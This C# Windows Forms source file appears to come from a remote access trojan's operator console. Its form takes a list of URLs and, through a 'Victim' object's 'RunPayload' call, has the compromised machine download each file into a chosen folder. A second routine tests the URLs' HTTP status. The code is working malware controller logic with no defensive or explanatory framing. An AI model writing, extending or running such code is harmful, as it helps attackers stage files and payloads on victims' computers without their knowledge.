using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Reception
{
    public partial class frmWGET : Form
    {
        public string save_folder = null;
        public Victim v = null;
        public Form1 form1 = null;

        public int thd_count = 20;
        public int timeout = 10000;

        public frmWGET()
        {
            InitializeComponent();
        }

        public void UpdateResult(string url, string path, string result)
        {
            ListViewItem item = new ListViewItem(url);
            item.SubItems.Add(path);
            item.SubItems.Add(result);
            listView2.Invoke(new Action(() =>
            {
                listView2.Items.Add(item);
                UpdateLogs($"{url} -> {path}");
                form1.FileListViewRefresh();
            }));
        }

        public void UpdateLogs(string msg)
        {
            DateTime date = DateTime.Now;
            string date_str = date.ToLongDateString();

            richTextBox1.AppendText($"[{date_str}]{msg}\n");
        }

        void Download()
        {
            ThreadPool.SetMinThreads(1, 1);
            ThreadPool.SetMaxThreads(thd_count, thd_count);
            foreach (string line in textEditorControl1.Text.Split(new string[] { Environment.NewLine }, StringSplitOptions.None))
                if (!string.IsNullOrEmpty(line))
                    ThreadPool.QueueUserWorkItem(x => v.RunPayload("File", v, new string[] { "wget", C1.StrE2B64Str(line), C1.StrE2B64Str(textBox1.Text), checkBox1.Checked ? "1" : "0" }));

            tabControl1.SelectedIndex = 0;
            tabControl2.SelectedIndex = 1;
        }

        void req_Test(object obj)
        {
            string url = obj.ToString();
            using (HttpClient client = new HttpClient())
            {
                client.Timeout = TimeSpan.FromMilliseconds(timeout);
                client.DefaultRequestHeaders.Accept.Clear();

                var response = client.GetAsync(url).Result;

                ListViewItem item = new ListViewItem(url);
                item.SubItems.Add(response.StatusCode.ToString());
                listView1.Invoke(new Action(() => listView1.Items.Add(item)));
            }
        }
        void Test_URL()
        {
            ThreadPool.SetMinThreads(1, 1);
            ThreadPool.SetMaxThreads(thd_count, thd_count);
            foreach (string line in textEditorControl1.Text.Split(new string[] { Environment.NewLine }, StringSplitOptions.None))
                if (!string.IsNullOrEmpty(line))
                    ThreadPool.QueueUserWorkItem(req_Test, line);
            tabControl1.SelectedIndex = 1;
        }

        void setup()
        {
            textBox1.Text = save_folder;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Download();
        }

        private void frmWGET_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Test_URL();
        }
    }
}
